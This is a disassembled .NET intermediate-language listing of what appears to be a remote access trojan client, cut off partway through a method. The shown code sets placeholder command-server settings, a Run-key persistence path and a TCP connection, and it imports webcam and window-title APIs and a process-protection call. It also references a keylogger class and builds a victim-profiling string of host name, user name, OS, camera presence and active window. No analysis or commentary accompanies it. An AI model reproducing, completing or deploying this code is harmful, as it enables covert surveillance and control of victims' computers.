
//  Microsoft (R) .NET Framework IL Disassembler.  Version 3.5.30729.1
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.module extern avicap32.dll
.module extern kernel32
.module extern user32.dll
.module extern user32
.module extern ntdll
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System.Drawing
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly j
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.
  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
.module j.exe
// MVID: {5991B206-D4A6-4D0C-AFFB-28DF5FE769AB}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000003    //  ILONLY 32BITREQUIRED
// Image base: 0x00470000

.class private auto ansi sealed beforefieldinit j.OK
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .field public static string VN
  .field public static string VR
  .field public static object MT
  .field public static string EXE
  .field public static string DR
  .field public static string RG
  .field public static string H
  .field public static string P
  .field public static string Y
  .field public static bool BD
  .field public static bool Idr
  .field public static bool IsF
  .field public static bool Isu
  .field public static class [mscorlib]System.IO.FileInfo LO
  .field public static class [mscorlib]System.IO.FileStream FS
  .field public static class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F
  .field public static class j.kl kq
  .field public static bool Cn
  .field public static string sf
  .field public static class [System]System.Net.Sockets.TcpClient C
  .field private static class [mscorlib]System.IO.MemoryStream MeM
  .field private static uint8[] b
  .field private static string lastcap
  .field public static object PLG
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       246 (0xf6)
    .maxstack  1
    IL_0000:  ldstr      "[VN]"
    IL_0005:  stsfld     string j.OK::VN
    IL_000a:  ldstr      "0.7d"
    IL_000f:  stsfld     string j.OK::VR
    IL_0014:  ldnull
    IL_0015:  stsfld     object j.OK::MT
    IL_001a:  ldstr      "[EXE]"
    IL_001f:  stsfld     string j.OK::EXE
    IL_0024:  ldstr      "[DR]"
    IL_0029:  stsfld     string j.OK::DR
    IL_002e:  ldstr      "[RG]"
    IL_0033:  stsfld     string j.OK::RG
    IL_0038:  ldstr      "[H]"
    IL_003d:  stsfld     string j.OK::H
    IL_0042:  ldstr      "[P]"
    IL_0047:  stsfld     string j.OK::P
    IL_004c:  ldstr      "|'|'|"
    IL_0051:  stsfld     string j.OK::Y
    IL_0056:  ldstr      "[BD]"
    IL_005b:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0060:  stsfld     bool j.OK::BD
    IL_0065:  ldstr      "[Idr]"
    IL_006a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_006f:  stsfld     bool j.OK::Idr
    IL_0074:  ldstr      "[Isf]"
    IL_0079:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_007e:  stsfld     bool j.OK::IsF
    IL_0083:  ldstr      "[Isu]"
    IL_0088:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_008d:  stsfld     bool j.OK::Isu
    IL_0092:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetEntryAssembly()
    IL_0097:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
    IL_009c:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_00a1:  stsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_00a6:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_00ab:  stsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_00b0:  ldnull
    IL_00b1:  stsfld     class j.kl j.OK::kq
    IL_00b6:  ldc.i4.0
    IL_00b7:  stsfld     bool j.OK::Cn
    IL_00bc:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    IL_00c1:  stsfld     string j.OK::sf
    IL_00c6:  ldnull
    IL_00c7:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_00cc:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_00d1:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
    IL_00d6:  ldc.i4     0x1401
    IL_00db:  newarr     [mscorlib]System.Byte
    IL_00e0:  stsfld     uint8[] j.OK::b
    IL_00e5:  ldstr      ""
    IL_00ea:  stsfld     string j.OK::lastcap
    IL_00ef:  ldnull
    IL_00f0:  stsfld     object j.OK::PLG
    IL_00f5:  ret
  } // end of method OK::.cctor

  .method private static pinvokeimpl("ntdll" winapi) 
          int32  NtSetInformationProcess(native int hProcess,
                                         int32 processInformationClass,
                                         int32& processInformation,
                                         int32 processInformationLength) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("avicap32.dll" nomangle ansi lasterr winapi) 
          bool  capGetDriverDescriptionA(int16 wDriver,
                                         string&  marshal( byvalstr) lpszName,
                                         int32 cbName,
                                         string&  marshal( byvalstr) lpszVer,
                                         int32 cbVer) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32" as "GetVolumeInformationA" nomangle ansi lasterr winapi) 
          int32  GetVolumeInformation(string&  marshal( byvalstr) lpRootPathName,
                                      string&  marshal( byvalstr) lpVolumeNameBuffer,
                                      int32 nVolumeNameSize,
                                      int32& lpVolumeSerialNumber,
                                      int32& lpMaximumComponentLength,
                                      int32& lpFileSystemFlags,
                                      string&  marshal( byvalstr) lpFileSystemNameBuffer,
                                      int32 nFileSystemNameSize) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextA" nomangle ansi lasterr winapi) 
          int32  GetWindowText(native int hWnd,
                               string&  marshal( byvalstr) WinTitle,
                               int32 MaxLength) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextLengthA" nomangle ansi lasterr winapi) 
          int32  GetWindowTextLength(int64 hwnd) cil managed preservesig
  {
  }
  .method public static void  DLV(string n) cil managed
  {
    // Code size       59 (0x3b)
    .maxstack  3
    .locals init (class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  ldc.i4.1
      IL_001f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0024:  ldarg.0
      IL_0025:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
      IL_002a:  leave.s    IL_003a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002c:  dup
      IL_002d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0032:  stloc.0
      IL_0033:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0038:  leave.s    IL_003a

    }  // end handler
    IL_003a:  ret
  } // end of method OK::DLV

  .method public static object  GTV(string n,
                                    object 'ret') cil managed
  {
    // Code size       68 (0x44)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_0023:  ldarg.0
      IL_0024:  ldarg.1
      IL_0025:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002a:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_002f:  stloc.0
      IL_0030:  leave.s    IL_0042

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0032:  dup
      IL_0033:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0038:  stloc.1
      IL_0039:  ldarg.1
      IL_003a:  stloc.0
      IL_003b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0040:  leave.s    IL_0042

    }  // end handler
    IL_0042:  ldloc.0
    IL_0043:  ret
  } // end of method OK::GTV

  .method public static bool  STV(string n,
                                  object t,
                                  valuetype [mscorlib]Microsoft.Win32.RegistryValueKind typ) cil managed
  {
    // Code size       70 (0x46)
    .maxstack  4
    .locals init (bool V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_0023:  ldarg.0
      IL_0024:  ldarg.1
      IL_0025:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002a:  ldarg.2
      IL_002b:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object,
                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0030:  ldc.i4.1
      IL_0031:  stloc.0
      IL_0032:  leave.s    IL_0044

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0034:  dup
      IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003a:  stloc.1
      IL_003b:  ldc.i4.0
      IL_003c:  stloc.0
      IL_003d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0042:  leave.s    IL_0044

    }  // end handler
    IL_0044:  ldloc.0
    IL_0045:  ret
  } // end of method OK::STV

  .method public static string  inf() cil managed
  {
    // Code size       941 (0x3ad)
    .maxstack  4
    .locals init (string V_0,
             string V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             string[] V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             string V_11,
             class [mscorlib]System.Exception V_12,
             string V_13,
             string V_14,
             valuetype [mscorlib]System.DateTime V_15,
             valuetype [mscorlib]System.DateTime V_16,
             int32 V_17,
             string[] V_18)
    IL_0000:  ldstr      "ll"
    IL_0005:  ldsfld     string j.OK::Y
    IL_000a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_000f:  stloc.1
    .try
    {
      IL_0010:  ldstr      "vn"
      IL_0015:  ldstr      ""
      IL_001a:  call       object j.OK::GTV(string,
                                                        object)
      IL_001f:  ldstr      ""
      IL_0024:  ldc.i4.0
      IL_0025:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                       object,
                                                                                                                                       bool)
      IL_002a:  brfalse.s  IL_005c

      IL_002c:  ldloc.1
      IL_002d:  ldsflda    string j.OK::VN
      IL_0032:  call       string j.OK::DEB(string&)
      IL_0037:  ldstr      "_"
      IL_003c:  call       string j.OK::HWD()
      IL_0041:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0046:  stloc.s    V_13
      IL_0048:  ldloca.s   V_13
      IL_004a:  call       string j.OK::ENB(string&)
      IL_004f:  ldsfld     string j.OK::Y
      IL_0054:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0059:  stloc.1
      IL_005a:  leave.s    IL_00c7

      IL_005c:  ldloc.1
      IL_005d:  ldstr      "vn"
      IL_0062:  ldstr      ""
      IL_0067:  call       object j.OK::GTV(string,
                                                        object)
      IL_006c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0071:  stloc.s    V_13
      IL_0073:  ldloca.s   V_13
      IL_0075:  call       string j.OK::DEB(string&)
      IL_007a:  ldstr      "_"
      IL_007f:  call       string j.OK::HWD()
      IL_0084:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0089:  stloc.s    V_14
      IL_008b:  ldloca.s   V_14
      IL_008d:  call       string j.OK::ENB(string&)
      IL_0092:  ldsfld     string j.OK::Y
      IL_0097:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_009c:  stloc.1
      IL_009d:  leave.s    IL_00c7

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_009f:  dup
      IL_00a0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00a5:  stloc.3
      IL_00a6:  ldloc.1
      IL_00a7:  call       string j.OK::HWD()
      IL_00ac:  stloc.s    V_14
      IL_00ae:  ldloca.s   V_14
      IL_00b0:  call       string j.OK::ENB(string&)
      IL_00b5:  ldsfld     string j.OK::Y
      IL_00ba:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00bf:  stloc.1
      IL_00c0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c5:  leave.s    IL_00c7

    }  // end handler
    .try
    {
      IL_00c7:  ldloc.1
      IL_00c8:  call       string [mscorlib]System.Environment::get_MachineName()
      IL_00cd:  ldsfld     string j.OK::Y
      IL_00d2:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00d7:  stloc.1
      IL_00d8:  leave.s    IL_00fa

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00da:  dup
      IL_00db:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00e0:  stloc.s    V_4
      IL_00e2:  ldloc.1
      IL_00e3:  ldstr      "\?\?"
      IL_00e8:  ldsfld     string j.OK::Y
      IL_00ed:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00f2:  stloc.1
      IL_00f3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00f8:  leave.s    IL_00fa

    }  // end handler
    .try
    {
      IL_00fa:  ldloc.1
      IL_00fb:  call       string [mscorlib]System.Environment::get_UserName()
      IL_0100:  ldsfld     string j.OK::Y
      IL_0105:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_010a:  stloc.1
      IL_010b:  leave.s    IL_012d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_010d:  dup
      IL_010e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0113:  stloc.s    V_5
      IL_0115:  ldloc.1
      IL_0116:  ldstr      "\?\?"
      IL_011b:  ldsfld     string j.OK::Y
      IL_0120:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0125:  stloc.1
      IL_0126:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_012b:  leave.s    IL_012d

    }  // end handler
    .try
    {
      IL_012d:  ldloc.1
      IL_012e:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0133:  callvirt   instance valuetype [mscorlib]System.DateTime [mscorlib]System.IO.FileSystemInfo::get_LastWriteTime()
      IL_0138:  stloc.s    V_15
      IL_013a:  ldloca.s   V_15
      IL_013c:  call       instance valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::get_Date()
      IL_0141:  stloc.s    V_16
      IL_0143:  ldloca.s   V_16
      IL_0145:  ldstr      "yy-MM-dd"
      IL_014a:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_014f:  ldsfld     string j.OK::Y
      IL_0154:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0159:  stloc.1
      IL_015a:  leave.s    IL_017c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_015c:  dup
      IL_015d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0162:  stloc.s    V_6
      IL_0164:  ldloc.1
      IL_0165:  ldstr      "\?\?-\?\?-\?\?"
      IL_016a:  ldsfld     string j.OK::Y
      IL_016f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0174:  stloc.1
      IL_0175:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_017a:  leave.s    IL_017c

    }  // end handler
    IL_017c:  ldloc.1
    IL_017d:  ldstr      ""
    IL_0182:  ldsfld     string j.OK::Y
    IL_0187:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_018c:  stloc.1
    .try
    {
      IL_018d:  ldloc.1
      IL_018e:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0193:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
      IL_0198:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
      IL_019d:  ldstr      "Microsoft"
      IL_01a2:  ldstr      ""
      IL_01a7:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01ac:  ldstr      "Windows"
      IL_01b1:  ldstr      "Win"
      IL_01b6:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01bb:  ldstr      bytearray (AE 00 ) 
      IL_01c0:  ldstr      ""
      IL_01c5:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01ca:  ldstr      bytearray (22 21 )                                           // "!
      IL_01cf:  ldstr      ""
      IL_01d4:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01d9:  ldstr      "  "
      IL_01de:  ldstr      " "
      IL_01e3:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01e8:  ldstr      " Win"
      IL_01ed:  ldstr      "Win"
      IL_01f2:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01f7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_01fc:  stloc.1
      IL_01fd:  leave.s    IL_021a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ff:  dup
      IL_0200:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0205:  stloc.s    V_7
      IL_0207:  ldloc.1
      IL_0208:  ldstr      "\?\?"
      IL_020d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0212:  stloc.1
      IL_0213:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0218:  leave.s    IL_021a

    }  // end handler
    IL_021a:  ldloc.1
    IL_021b:  ldstr      "SP"
    IL_0220:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0225:  stloc.1
    .try
    {
      IL_0226:  call       class [mscorlib]System.OperatingSystem [mscorlib]System.Environment::get_OSVersion()
      IL_022b:  callvirt   instance string [mscorlib]System.OperatingSystem::get_ServicePack()
      IL_0230:  ldstr      " "
      IL_0235:  ldc.i4.m1
      IL_0236:  ldc.i4.0
      IL_0237:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_023c:  stloc.s    V_8
      IL_023e:  ldloc.s    V_8
      IL_0240:  ldlen
      IL_0241:  conv.ovf.i4
      IL_0242:  ldc.i4.1
      IL_0243:  bne.un.s   IL_0251

      IL_0245:  ldloc.1
      IL_0246:  ldstr      "0"
      IL_024b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0250:  stloc.1
      IL_0251:  ldloc.1
      IL_0252:  ldloc.s    V_8
      IL_0254:  ldloc.s    V_8
      IL_0256:  ldlen
      IL_0257:  conv.ovf.i4
      IL_0258:  ldc.i4.1
      IL_0259:  sub.ovf
      IL_025a:  ldelem.ref
      IL_025b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0260:  stloc.1
      IL_0261:  leave.s    IL_027e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0263:  dup
      IL_0264:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0269:  stloc.s    V_9
      IL_026b:  ldloc.1
      IL_026c:  ldstr      "0"
      IL_0271:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0276:  stloc.1
      IL_0277:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_027c:  leave.s    IL_027e

    }  // end handler
    .try
    {
      IL_027e:  ldc.i4.s   38
      IL_0280:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0285:  ldstr      "x86"
      IL_028a:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_028f:  brfalse.s  IL_02a4

      IL_0291:  ldloc.1
      IL_0292:  ldstr      " x64"
      IL_0297:  ldsfld     string j.OK::Y
      IL_029c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02a1:  stloc.1
      IL_02a2:  leave.s    IL_02d2

      IL_02a4:  ldloc.1
      IL_02a5:  ldstr      " x86"
      IL_02aa:  ldsfld     string j.OK::Y
      IL_02af:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_02b4:  stloc.1
      IL_02b5:  leave.s    IL_02d2

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02b7:  dup
      IL_02b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02bd:  stloc.s    V_10
      IL_02bf:  ldloc.1
      IL_02c0:  ldsfld     string j.OK::Y
      IL_02c5:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02ca:  stloc.1
      IL_02cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02d0:  leave.s    IL_02d2

    }  // end handler
    IL_02d2:  call       bool j.OK::Cam()
    IL_02d7:  brfalse.s  IL_02ec

    IL_02d9:  ldloc.1
    IL_02da:  ldstr      "Yes"
    IL_02df:  ldsfld     string j.OK::Y
    IL_02e4:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_02e9:  stloc.1
    IL_02ea:  br.s       IL_02fd

    IL_02ec:  ldloc.1
    IL_02ed:  ldstr      "No"
    IL_02f2:  ldsfld     string j.OK::Y
    IL_02f7:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_02fc:  stloc.1
    IL_02fd:  ldloc.1
    IL_02fe:  ldsfld     string j.OK::VR
    IL_0303:  ldsfld     string j.OK::Y
    IL_0308:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_030d:  stloc.1
    IL_030e:  ldloc.1
    IL_030f:  ldstr      ".."
    IL_0314:  ldsfld     string j.OK::Y
    IL_0319:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_031e:  stloc.1
    IL_031f:  ldloc.1
    IL_0320:  call       string j.OK::ACT()
    IL_0325:  ldsfld     string j.OK::Y
    IL_032a:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_032f:  stloc.1
    IL_0330:  ldstr      ""
    IL_0335:  stloc.2
    .try
    {
      IL_0336:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_033b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0340:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0345:  ldstr      "Software\\"
      IL_034a:  ldsfld     string j.OK::RG
      IL_034f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0354:  ldc.i4.0
      IL_0355:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string,
                                                                                                                                    valuetype [mscorlib]Microsoft.Win32.RegistryKeyPermissionCheck)
      IL_035a:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_035f:  stloc.s    V_18
      IL_0361:  ldc.i4.0
      IL_0362:  stloc.s    V_17
      IL_0364:  br.s       IL_038c

      IL_0366:  ldloc.s    V_18
      IL_0368:  ldloc.s    V_17
      IL_036a:  ldelem.ref
      IL_036b:  stloc.s    V_11
      IL_036d:  ldloc.s    V_11
      IL_036f:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0374:  ldc.i4.s   32
      IL_0376:  bne.un.s   IL_0386

      IL_0378:  ldloc.2
      IL_0379:  ldloc.s    V_11
      IL_037b:  ldstr      ","
      IL_0380:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0385:  stloc.2
      IL_0386:  ldloc.s    V_17
      IL_0388:  ldc.i4.1
      IL_0389:  add.ovf
      IL_038a:  stloc.s    V_17
      IL_038c:  ldloc.s    V_17
      IL_038e:  ldloc.s    V_18
      IL_0390:  ldlen
      IL_0391:  conv.ovf.i4
      IL_0392:  blt.s      IL_0366

      IL_0394:  leave.s    IL_03a5

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0396:  dup
      IL_0397:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_039c:  stloc.s    V_12
